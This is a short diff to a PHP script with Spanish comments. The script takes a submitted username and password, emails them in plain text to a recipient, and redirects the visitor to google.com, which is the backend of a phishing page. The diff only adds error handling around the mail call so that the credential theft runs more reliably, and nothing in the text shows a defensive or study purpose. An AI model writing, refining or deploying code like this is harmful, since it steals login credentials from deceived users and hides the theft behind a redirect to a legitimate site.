@@ -9,10 +9,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mensaje = "Usuario: $usuario\nContraseña: $contraseña";
 
     // Envío de correo electrónico
-    mail($destinatario, $asunto, $mensaje);
-
-    // Redireccionar a una página de éxito o mostrar un mensaje de éxito
-    header("Location: https://www.google.com");
-    exit();
+    if (mail($destinatario, $asunto, $mensaje)) {
+        // Redireccionar al usuario a la página principal de Google después de enviar el correo electrónico
+        header("Location: https://www.google.com");
+        exit();
+    } else {
+        echo "Hubo un error al enviar el correo electrónico.";
+    }
 }
 ?>
